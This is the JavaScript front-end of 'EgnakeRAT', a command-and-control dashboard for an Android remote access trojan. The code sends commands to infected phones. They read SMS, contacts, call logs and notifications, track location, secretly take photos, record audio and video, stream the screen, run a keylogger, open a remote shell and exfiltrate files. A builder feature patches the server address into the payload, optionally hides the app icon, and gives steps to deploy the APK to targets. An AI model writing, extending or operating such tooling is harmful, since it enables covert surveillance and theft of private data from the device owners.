/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
   EgnakeRAT NEURAL C2 - Dashboard Controller
   Professional UI/UX Update - Lucide Icons - Node Network
   â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */

let socket, devices = {}, selDev = null, map = null;
let klRunning = false, ssRunning = false;
let frameCount = 0, lastFpsTime = Date.now();

const CMDS = [
  // Information
  { cmd:'deviceInfo',       icon:'server',          label:'DEVICE SPECS',    cat:'tactical' },
  { cmd:'getBatteryStatus', icon:'battery',         label:'BATTERY',         cat:'tactical' },
  { cmd:'getWifiInfo',      icon:'wifi',            label:'WIFI NETWORK',    cat:'tactical' },
  { cmd:'getIP',            icon:'network',         label:'NETWORK IP',      cat:'tactical' },
  { cmd:'getMACAddress',    icon:'hash',            label:'MAC ADDRESS',     cat:'tactical' },
  { cmd:'getSimDetails',    icon:'sim-card',        label:'SIM INTEL',       cat:'tactical' },
  { cmd:'getInstalledApps', icon:'package',         label:'PACKAGE LIST',    cat:'tactical' },
  { cmd:'getClipData',      icon:'clipboard-list',  label:'CLIPBOARD',       cat:'tactical' },
  // Surveillance & Intel
  { cmd:'getLocation',      icon:'map-pin',         label:'GEOLOCATE',       cat:'tactical' },
  { cmd:'getSMS',           icon:'message-square',  label:'READ SMS',        cat:'tactical', args:{box:'inbox'} },
  { cmd:'getCallLogs',      icon:'phone-call',      label:'CALL LOGS',       cat:'tactical' },
  { cmd:'getContacts',      icon:'users',           label:'CONTACTS',        cat:'tactical' },
  { cmd:'getNotifications', icon:'bell-ring',       label:'NOTIFICATIONS',   cat:'tactical' },
  // Media Optic
  { cmd:'camList',          icon:'video',           label:'CAMERA SCAN',     cat:'tactical' },
  { cmd:'takepic',          icon:'camera',          label:'FORCE PHOTO',     cat:'tactical', args:{camera_id:0} },
  { cmd:'screenshot',       icon:'monitor',         label:'SCREENSHOT',      cat:'tactical' },
  { cmd:'startAudio',       icon:'mic',             label:'MIC INTERCEPT',   cat:'tactical' },
  { cmd:'stopAudio',        icon:'mic-off',         label:'STOP MIC',        cat:'tactical' },
  { cmd:'startVideo',       icon:'film',            label:'REC VIDEO',       cat:'tactical', args:{camera_id:0} },
  { cmd:'stopVideo',        icon:'square',          label:'STOP VIDEO',      cat:'tactical' },
  // Accessibility & System
  { cmd:'checkAccessibility',icon:'activity',       label:'A11Y STATUS',     cat:'tactical' },
  { cmd:'enableAccessibility',icon:'settings-2',    label:'FORCE A11Y',      cat:'tactical' },
  { cmd:'readScreen',       icon:'scan-text',       label:'READ UI TREE',    cat:'tactical' },
  { cmd:'shell',            icon:'terminal',        label:'SECURE SHELL',    cat:'system' },
  { cmd:'fileList',         icon:'folder-open',     label:'FILE EXFIL',      cat:'system', args:{path:'/sdcard'} },
  // Action & Live
  { cmd:'makeCall',         icon:'phone-outgoing',  label:'FORCE CALL',      cat:'tactical', prompt:'call' },
  { cmd:'vibrate',          icon:'vibrate',         label:'VIBRATE DEVICE',  cat:'tactical', args:{times:3} },
  { cmd:'openUrl',          icon:'external-link',   label:'OPEN URL',        cat:'tactical', prompt:'url' },
  { cmd:'sendSMS',          icon:'send',            label:'SEND SMS',        cat:'tactical', prompt:'sms' },
  { cmd:'showToast',        icon:'message-circle',  label:'SHOW TOAST',      cat:'tactical', prompt:'message' },
  { cmd:'lockScreen',       icon:'lock',            label:'LOCK SCREEN',     cat:'tactical', danger:true },
  { cmd:'performAction',    icon:'pointer',         label:'REMOTE ACTION',   cat:'tactical', prompt:'action' }
];

/* Initialization */
document.addEventListener('DOMContentLoaded', () => {
  initSocket();
  refreshGlobal();
  setInterval(refreshGlobal, 8000);
  setInterval(updateTime, 1000);
  updateTime();
  lucide.createIcons(); // Initial load icons
});

function refreshGlobal() {
  loadStats();
  loadDevices();
}

function updateTime() {
  const el = document.getElementById('sys-time');
  if(el) el.textContent = new Date().toISOString().split('T')[1].split('.')[0] + ' UTC';
}

function reIcon() { setTimeout(() => lucide.createIcons(), 10); }

/* Socket Io Subroutines */
function initSocket() {
  socket = io();

  socket.on('device_connected', d => {
    toast('Node Uplink Established: ' + (d.info.model || 'Unknown'), 'ok', 'check-circle');
    addGlobalLog('UPLINK ESTABLISHED: ' + (d.info.model || 'Unknown') + ' (' + d.ip + ')', 'success');
    refreshGlobal();
  });

  socket.on('device_disconnected', d => {
    const id = (d.device_id || '').substring(0, 8);
    toast('Node Offline: ' + id, 'err', 'alert-triangle');
    addGlobalLog('CONNECTION LOST: ' + id, 'error');
    if (selDev === d.device_id) { selDev = null; switchMainView('dashboard'); }
    refreshGlobal();
  });

  socket.on('heartbeat', d => {
    if (devices[d.device_id]) {
      Object.assign(devices[d.device_id], d.info);
      renderDevices();
    }
  });

  socket.on('command_response', d => {
    const r = d.response || {};
    const txt = JSON.stringify(r.data || {}).substring(0, 300);
    const id = d.device_id.substring(0, 8);
    addGlobalLog('[NODE ' + id + '] ' + txt, r.status === 'success' ? 'success' : 'error');
    if (selDev === d.device_id) {
      appendAudit(d.command || 'response', r.status === 'success', txt);
    }
  });

  socket.on('file_received', d => {
    toast('File Captured: ' + d.filename, 'ok', 'download');
    addGlobalLog('FILE EXFILTRATED: ' + d.filename + ' (' + fmtBytes(d.file_size) + ')', 'success');
    if (selDev === d.device_id) loadFiles(d.device_id);
  });

  socket.on('shell_output', d => {
    if (selDev === d.device_id) {
      const shOut = document.getElementById('sh-out');
      if (shOut) {
        const div = document.createElement('div');
        div.className = 'log-sys'; div.textContent = d.output;
        shOut.appendChild(div); shOut.scrollTop = shOut.scrollHeight;
      }
    }
  });

  socket.on('command_sent', d => {
    if (d.success) addGlobalLog('PACKET TRANSMITTED: ' + d.cmd, '');
  });

  socket.on('keylog_data', d => {
    if (selDev === d.device_id) { appendKeylog(d.data); }
  });

  socket.on('screen_frame', d => {
    if (selDev === d.device_id && ssRunning) { renderFrame(d.frame); }
  });

  socket.on('notification_data', d => {
    if (selDev === d.device_id) { appendIntel(d.data); }
  });
}

/* Data Pull */
async function loadStats() {
  try {
    const s = await (await fetch('/api/stats')).json();
    ['online', 'total', 'cmds', 'keylogs'].forEach(k => setText('hd-'+k, s[k+'_devices'] || s['total_'+k] || 0));
    setText('c-online', s.online_devices); setText('c-online-side', s.online_devices);
    setText('c-total', s.total_devices);
    setText('c-cmds', s.total_commands);
    setText('c-keylogs', s.total_keylogs || 0);
    setText('c-notifs', s.total_notifications || 0);
    setText('c-files', s.total_files);
  } catch(e) {}
}

async function loadDevices() {
  try {
    const list = await (await fetch('/api/devices')).json();
    devices = {}; list.forEach(d => devices[d.device_id] = d);
    renderDevices();
  } catch(e) {}
}

async function loadKeylogs() {
  if (!selDev) return;
  try {
    const data = await (await fetch('/api/keylogs/' + selDev)).json();
    const el = document.getElementById('kl-stream');
    el.innerHTML = '';
    data.reverse().forEach(k => appendKeylog({app: k.app_name, text: k.text, timestamp: k.created_at}));
  } catch(e) {}
}

async function loadNotifications() {
  if (!selDev) return;
  try {
    const data = await (await fetch('/api/notifications/' + selDev)).json();
    const el = document.getElementById('intel-feed');
    el.innerHTML = '';
    data.forEach(n => appendIntel({package: n.package_name, title: n.title, content: n.content, timestamp: n.created_at}));
  } catch(e) {}
}

async function loadFiles(did) {
  try {
    const files = await (await fetch('/api/files/' + did)).json();
    const tb = document.getElementById('files-tbody');
    if (!files.length) {
      tb.innerHTML = '<tr><td colspan="5" style="text-align:center;color:var(--text-dim);padding:30px">NO EXFILTRATED ARTIFACTS FOUND</td></tr>';
      return;
    }
    tb.innerHTML = files.map(f =>
      `<tr>
        <td><i data-lucide="file" style="margin-right:8px;vertical-align:middle;color:var(--brand)"></i> ${f.filename}</td>
        <td><span class="tag">${f.file_type}</span></td>
        <td style="font-family:var(--font-mono)">${fmtBytes(f.file_size)}</td>
        <td style="font-family:var(--font-mono)">${new Date(f.created_at).toISOString().replace('T', ' ').substring(0, 19)}</td>
        <td><a href="/api/file/download/${did.substring(0,12)}/${f.filename}" class="dl-link" title="Download"><i data-lucide="download"></i> PULL</a></td>
      </tr>`
    ).join('');
    reIcon();
  } catch(e) {}
}

/* Ui Renderers */
function renderDevices() {
  const el = document.getElementById('device-list');
  const arr = Object.values(devices);
  if (!arr.length) {
    el.innerHTML = `<div class="empty-state" style="padding:20px 10px"><i data-lucide="server-off"></i><h4 style="font-size:11px">NO ACTIVE NODES</h4></div>`;
    reIcon(); return;
  }
  el.innerHTML = arr.map(d =>
    `<div class="device-item ${selDev === d.device_id ? 'active' : ''}" onclick="selectAsset('${d.device_id}')">
      <div class="d-icon"><i data-lucide="${d.is_online ? 'radio' : 'power-off'}"></i></div>
      <div class="d-details">
        <span class="d-name">${d.model || 'UNKNOWN ASSET'}</span>
        <span class="d-ip">${d.ip_address || 'OFFLINE'}</span>
      </div>
    </div>`
  ).join('');
  reIcon();
}

async function selectAsset(did) {
  selDev = did;
  renderDevices();

  try {
    const data = await (await fetch('/api/device/' + did)).json();
    if (!data) return;
    const dev = data.device;
    
    setText('d-model', dev.model || 'UNKNOWN DEVICE');
    document.getElementById('d-ip').innerHTML = `<i data-lucide="network"></i> ${dev.ip_address || 'â€”'}`;
    document.getElementById('d-os').innerHTML = `<i data-lucide="type"></i> ANDROID ${dev.android_version || '?'}`;
    
    const sTag = document.getElementById('d-status');
    if(data.is_online) { sTag.className='tag success'; sTag.innerHTML = `<span class="dot"></span> ONLINE`; }
    else { sTag.className='tag'; sTag.innerHTML = `OFFLINE`; }

    document.getElementById('d-chips').innerHTML = [
      chip('battery-charging', 'BATTERY', dev.battery_level >= 0 ? dev.battery_level + '%' : 'â€”'),
      chip('wifi', 'SSID', dev.wifi_ssid || 'â€”'),
      chip('cpu', 'MANUFACTURER', dev.manufacturer || 'â€”'),
      chip('fingerprint', 'NODE ID', (dev.device_id || '').substring(0, 12).toUpperCase())
    ].join('');

    renderCmdMatrix();
    loadFiles(did);
    renderAudit(data.history);

    const ti = document.getElementById('term-input');
    ti.disabled = false; ti.placeholder = `Command route set to: ${dev.model}...`;

    // Reset module logic
    klRunning = false; ssRunning = false;
    klToggleUI(); ssToggleUI();

    switchMainView('device');
    switchTab('tactical');
    reIcon();
  } catch(e) {}
}

function chip(icon, lbl, val) {
  return `<div class="t-chip"><i data-lucide="${icon}"></i><div class="t-info"><div class="lbl">${lbl}</div><div class="val">${val}</div></div></div>`;
}

function renderCmdMatrix() {
  let html = '';
  // Info/Tactical 
  html += `<div class="cmd-group"><div class="cmd-group-head">TACTICAL & SURVEILLANCE</div><div class="cmd-grid">`;
  CMDS.filter(c => c.cat === 'tactical').forEach(c => {
    html += `<div class="cmd-tile ${c.danger ? 'danger' : ''}" onclick="fireCmd('${c.cmd}', ${JSON.stringify(c.args||{}).replace(/"/g,"'")}, '${c.prompt||''}')">
      <div class="cmd-icon"><i data-lucide="${c.icon}"></i></div><div class="cmd-lbl">${c.label}</div></div>`;
  });
  html += `</div></div>`;
  
  // System Categories (can be split later)
  
  document.getElementById('cmd-matrix').innerHTML = html;
  reIcon();
}

function fireCmd(cmd, args, promptType) {
  if (!selDev) return toast('NO DEVICE SELECTED', 'err', 'slash');
  let a = args || {};

  if (promptType === 'url') {
    const v = prompt('TARGET URL:'); if (!v) return; a = {url: v};
  } else if (promptType === 'sms') {
    const n = prompt('TARGET NUMBER:'); if (!n) return;
    const m = prompt('MESSAGE PAYLOAD:'); if (!m) return;
    a = {number:n, message:m};
  } else if (promptType === 'message') {
    const m = prompt('TOAST CONTENT:'); if (!m) return; a = {message:m};
  } else if (promptType === 'call') {
    const n = prompt('DIAL NUMBER:'); if (!n) return; a = {number:n};
  } else if (promptType === 'action') {
    const act = prompt('ACTION (back, home, recents, click, typeText):'); if (!act) return;
    a = { action: act };
    if (act === 'click') {
      a.x = parseInt(prompt('X YIELD:') || 540);
      a.y = parseInt(prompt('Y YIELD:') || 960);
    } else if (act === 'typeText') {
      a.text = prompt('TEXT PAYLOAD:') || '';
    }
  }

  socket.emit('send_command', { device_id: selDev, cmd: cmd, args: a });
  termLine('-> EXEC: ' + cmd, 'log-info');
  toast('OP TRANSMITTED: ' + cmd, 'inf', 'radio');
}

/* Terminals */
function termExec() {
  const el = document.getElementById('term-input');
  const v = el.value.trim(); if (!v) return;
  termLine('> ' + v, 'log-sys');
  if (v === 'clear') {
    document.getElementById('term-out').innerHTML = '';
  } else if (v === 'help') {
    termLine('Available global commands:', 'log-sys');
    termLine('  clear               Clear console', 'log-info');
    termLine('Available node subroutines:', 'log-sys');
    CMDS.forEach(c => termLine('  ' + c.cmd.padEnd(20) + c.label, 'log-info'));
  } else {
    if (!selDev) {
      termLine('ERROR: No active asset. Select a node from the left menu to route commands.', 'log-err');
    } else {
      const found = CMDS.find(c => c.cmd === v);
      if(found) socket.emit('send_command', { device_id: selDev, cmd: v, args: found.args||{} });
      else termLine('UNKNOWN SUBROUTINE: ' + v, 'log-err');
    }
  }
  el.value = '';
}
function termLine(txt, cls) {
  const el = document.getElementById('term-out');
  const d = document.createElement('div');
  d.className = cls || ''; d.textContent = txt;
  el.appendChild(d); el.scrollTop = el.scrollHeight;
}

function shellExec() {
  const el = document.getElementById('sh-input');
  const v = el.value.trim(); if (!v || !selDev) return;
  
  const shOut = document.getElementById('sh-out');
  const d = document.createElement('div');
  d.className = 'log-info'; d.textContent = '-> ' + v;
  shOut.appendChild(d); shOut.scrollTop = shOut.scrollHeight;

  socket.emit('shell_input', { device_id: selDev, input: v });
  el.value = '';
}

/* Module: Keylogger */
function toggleKeylogger() {
  if (!selDev) return;
  if (klRunning) {
    socket.emit('stop_keylogger', { device_id: selDev }); klRunning = false;
  } else {
    socket.emit('start_keylogger', { device_id: selDev }); klRunning = true;
  }
  klToggleUI();
}
function klToggleUI() {
  const btn = document.getElementById('btn-kl-toggle');
  const r = document.getElementById('kl-ring'), d = document.getElementById('kl-dot');
  const st = document.getElementById('kl-status-text');
  
  if(klRunning){
    btn.innerHTML = `<i data-lucide="power-off"></i> HALT`; btn.className = 'btn btn-outline danger';
    r.className = 'ring'; d.className = 'dot';
    st.textContent = "INTERCEPTING REAL-TIME..."; st.style.color = 'var(--success)';
  } else {
    btn.innerHTML = `<i data-lucide="power"></i> INITIATE`; btn.className = 'btn btn-primary';
    r.className = 'ring off'; d.className = 'dot off';
    st.textContent = "KEYLOGGER OFFLINE"; st.style.color = 'var(--text-muted)';
  }
  reIcon();
}
function appendKeylog(data) {
  const el = document.getElementById('kl-stream'); if(!el) return;
  const d = document.createElement('div'); d.className = 'kl-entry';
  const t = data.timestamp ? new Date(data.timestamp).toLocaleTimeString() : new Date().toLocaleTimeString();
  d.innerHTML = `<div class="kl-meta"><span class="kl-app">[${(data.app||'?').split('.').pop().toUpperCase()}]</span> <span>${t}</span></div><div class="kl-data">${escapeHtml(data.text||'')}</div>`;
  el.prepend(d);
  if(el.children.length>200) el.removeChild(el.lastChild);
}
function clearKeylogUI() { document.getElementById('kl-stream').innerHTML=''; }

/* Module: Screen Optics */
function toggleScreenStream() {
  if (!selDev) return;
  if(ssRunning){
    socket.emit('stop_screen_stream', {device_id:selDev}); ssRunning = false;
  } else {
    const fps = parseInt(document.getElementById('ss-fps').value)||5;
    socket.emit('start_screen_stream', {device_id:selDev, fps:fps});
    ssRunning = true; frameCount = 0; lastFpsTime = Date.now();
  }
  ssToggleUI();
}
function ssToggleUI() {
  const btn = document.getElementById('btn-ss-toggle');
  const r = document.getElementById('ss-ring'), d = document.getElementById('ss-dot');
  const st = document.getElementById('ss-status-text');
  
  const sb = document.getElementById('optics-standby');
  const cv = document.getElementById('optics-canvas');
  const hud = document.getElementById('optics-hud');

  if(ssRunning){
    btn.innerHTML = `<i data-lucide="video-off"></i> CUT FEED`; btn.className = 'btn btn-outline danger';
    r.className = 'ring'; d.className = 'dot blink';
    st.textContent = "STREAMING OPTICS..."; st.style.color = 'var(--warning)';
    sb.classList.add('hidden'); cv.classList.remove('hidden'); hud.classList.remove('hidden');
  } else {
    btn.innerHTML = `<i data-lucide="video"></i> ENGAGE OPTICS`; btn.className = 'btn btn-primary';
    r.className = 'ring off'; d.className = 'dot off';
    st.textContent = "OPTICS OFFLINE"; st.style.color = 'var(--text-muted)';
    sb.classList.remove('hidden'); cv.classList.add('hidden'); hud.classList.add('hidden');
  }
  reIcon();
}
function renderFrame(b64) {
  const cv = document.getElementById('optics-canvas'); if(!cv) return;
  const ctx = cv.getContext('2d');
  const img = new Image();
  img.onload = () => {
    if(cv.width !== img.width || cv.height !== img.height) { cv.width = img.width; cv.height = img.height; }
    ctx.drawImage(img, 0, 0);
    frameCount++;
    const now = Date.now();
    if(now - lastFpsTime >= 1000) {
      document.getElementById('hud-fps').textContent = Math.round(frameCount * 1000 / (now-lastFpsTime)) + ' FPS';
      frameCount = 0; lastFpsTime = now;
    }
  };
  img.src = 'data:image/jpeg;base64,' + b64;
}
function toggleScreenFullscreen() {
  const v = document.getElementById('optics-view');
  if(!v) return;
  if(document.fullscreenElement) document.exitFullscreen();
  else v.requestFullscreen();
}

/* Module: Intel Feed Notifs */
function appendIntel(data) {
  const el = document.getElementById('intel-feed'); if(!el) return;
  if(el.querySelector('.empty-state')) el.innerHTML = '';
  
  const pkg = (data.package||'unknown').split('.').pop();
  const t = data.timestamp ? new Date(data.timestamp).toLocaleString() : new Date().toLocaleString();
  
  const d = document.createElement('div'); d.className = 'intel-card';
  d.innerHTML = `
    <div class="intel-head">
      <div class="intel-icon"><i data-lucide="message-square-dashed"></i></div>
      <div class="intel-pkg">${pkg}</div>
      <div class="intel-time">${t}</div>
    </div>
    <div class="intel-title">${escapeHtml(data.title||'')}</div>
    <div class="intel-body">${escapeHtml(data.content||'')}</div>
  `;
  el.prepend(d);
  if(el.children.length>200) el.removeChild(el.lastChild);
  reIcon();
}

/* General Ui Controls */
function switchMainView(vid) {
  ['dashboard', 'device', 'build', 'map', 'docs'].forEach(id => {
    const el = document.getElementById('view-'+id);
    if(el) { el.classList.remove('active'); el.classList.add('hidden'); }
  });
  
  const target = document.getElementById('view-'+vid);
  if(target) { target.classList.add('active'); target.classList.remove('hidden'); }
  
  document.querySelectorAll('.nav-item').forEach(b => b.classList.remove('active'));
  const bm = {dashboard:'nav-dash', map:'nav-map', build:'nav-build', docs:'nav-docs'};
  if(bm[vid]) document.getElementById(bm[vid])?.classList.add('active');

  if(vid === 'map') {
    initMap();
    setTimeout(() => { if(map) map.invalidateSize(); }, 200);
  }
  if(vid === 'build') loadServerInfo();
  if(vid === 'dashboard') { selDev = null; renderDevices(); }
  reIcon();
}

function switchTab(tid) {
  document.querySelectorAll('.tab-pane').forEach(p => p.classList.add('hidden'));
  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
  
  document.getElementById('tab-'+tid)?.classList.remove('hidden');
  document.querySelector(`.tab[data-tab="${tid}"]`)?.classList.add('active');

  if(tid === 'terminal' && selDev) {
    socket.emit('start_shell', {device_id: selDev});
    const so = document.getElementById('sh-out'); so.innerHTML='';
    const d = document.createElement('div'); d.className='log-sys'; d.textContent="Initiating secure PTY connection...";
    so.appendChild(d);
  }
  if(tid === 'keylogger') loadKeylogs();
  if(tid === 'intel') loadNotifications();
}

/* Audit Logs */
function renderAudit(h) {
  const el = document.getElementById('audit-log');
  if(!h || !h.length) { el.innerHTML = `<div class="empty-state"><i data-lucide="history"></i><h4>NO AUDIT DATA</h4></div>`; reIcon(); return; }
  el.innerHTML = h.map(i => `
    <div class="log-item">
      <div class="log-time">[${new Date(i.created_at).toISOString().split('T')[1].substring(0,8)}]</div>
      <div class="log-msg ${i.status==='success'?'success':'error'}">CMD: ${i.command} <br/>RES: ${(i.response||'').substring(0,80)}</div>
    </div>
  `).join('');
}
function appendAudit(c, ok, res) {
  const el = document.getElementById('audit-log'); if(!el) return;
  if(el.querySelector('.empty-state')) el.innerHTML = '';
  const d = document.createElement('div'); d.className='log-item';
  d.innerHTML = `<div class="log-time">[${new Date().toISOString().split('T')[1].substring(0,8)}]</div>
    <div class="log-msg ${ok?'success':'error'}">CMD: ${c} <br/>RES: ${(res||'').substring(0,80)}</div>`;
  el.prepend(d);
}
function addGlobalLog(msg, type) {
  const el = document.getElementById('activity-log'); if(!el) return;
  if(el.querySelector('.empty-state')) el.innerHTML='';
  const d = document.createElement('div'); d.className = 'log-item';
  d.innerHTML = `<div class="log-time">[${new Date().toISOString().split('T')[1].substring(0,8)}]</div>
                 <div class="log-msg ${type}">${msg}</div>`;
  el.prepend(d);
  if(el.children.length>50) el.removeChild(el.lastChild);
}

/* System Builder */
async function loadServerInfo() {
  try {
    const info = await (await fetch('/api/server/info')).json();
    document.getElementById('b-key').value = info.passphrase || '';
    document.getElementById('b-port').value = info.port || '8000';
    document.getElementById('srv-info').innerHTML = `
      <div class="log-info mb-2">HOST IP ROUTING</div>
      <div class="log-sys" style="font-size:14px; margin-bottom:16px">${info.host||'0.0.0.0'}</div>
      <div class="log-info mb-2">LISTENING PORT</div>
      <div class="log-sys" style="font-size:14px; margin-bottom:16px">${info.port||'8000'}</div>
      <div class="log-info mb-2">CRYPTO KEY HASH</div>
      <div class="log-sys" style="font-size:14px; word-break:break-all">${(info.key_hash||'').substring(0, 32)}...</div>
    `;
  } catch(e) {}
}

async function initiateBuild() {
  const ip = document.getElementById('b-ip').value.trim();
  const port = document.getElementById('b-port').value.trim();
  const key = document.getElementById('b-key').value.trim();
  const icon = document.getElementById('b-icon').value;
  const out = document.getElementById('b-out');

  if(!ip || !port) { out.textContent = "[ERROR] IP Address and Port parameters required."; return; }
  out.textContent = "[SYSTEM] Initializing payload compilation. Updating Java definitions...";

  try {
    const resp = await fetch('/api/build', {
      method: 'POST', headers: {'Content-Type':'application/json'},
      body: JSON.stringify({ip, port, passphrase:key, hide_icon:icon==='true'})
    });
    const code = await resp.json();
    if(code.success) {
      out.textContent = `[SUCCESS] Source configurations patched.\n\nNext protocol:\n1) Open Android_Code in Android Studio\n2) Execute Gradle assembleRelease Task\n3) Deploy APK to target grid`;
      toast('PAYLOAD CONFIG UPDATED', 'ok', 'check-circle');
    } else {
      out.textContent = `[ERROR] Compile failed: ${code.error}`;
      toast('BUILD FAILED', 'err', 'alert-triangle');
    }
  } catch(e) { out.textContent = `[ERROR] Network failure: ${e.message}`; }
}

/* Map Engine */
function initMap() {
  if(map) return;
  map = L.map('map-container').setView([20, 0], 2);
  L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
    maxZoom:19, attribution: 'EgnakeRAT MAP ENGINE'
  }).addTo(map);
  setTimeout(()=>map.invalidateSize(), 300);
}

/* Utils */
function toast(msg, type, lucideIcon='bell') {
  const c = document.getElementById('toast-container');
  const d = document.createElement('div'); d.className = 'toast ' + type;
  d.innerHTML = `<i data-lucide="${lucideIcon}"></i> <span>${msg}</span>`;
  c.appendChild(d);
  lucide.createIcons({root: d});
  setTimeout(() => d.remove(), 3500);
}

function setText(id, val) { const e = document.getElementById(id); if(e) e.textContent=val; }
function escapeHtml(s) { const d=document.createElement('div'); d.textContent=s; return d.innerHTML; }
function fmtBytes(b) {
  if(!b) return '0 B';
  const i = Math.floor(Math.log(b)/Math.log(1024));
  return parseFloat((b/Math.pow(1024,i)).toFixed(1)) + ' ' + ['B','KB','MB','GB'][i];
}
